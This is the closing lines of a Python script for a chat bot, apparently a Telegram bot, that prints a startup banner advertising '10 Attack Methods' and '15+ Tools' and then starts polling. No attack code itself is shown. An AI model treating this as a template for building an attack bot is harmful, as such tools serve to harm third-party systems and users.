print(f"\n✅ SUMIT BOT v4.0 - USER BOT LOADED")
print(f"👤 Owner: {ADMIN_USER} | Made by: {BOT_OWNER}")
print(f"🔥 10 Attack Methods | 15+ Tools | Inline Keyboard\n")
try: bot.infinity_polling(timeout=60)
except KeyboardInterrupt: print("\n[!] Stopped")
except Exception as e: print(f"[!] Error: {e}")
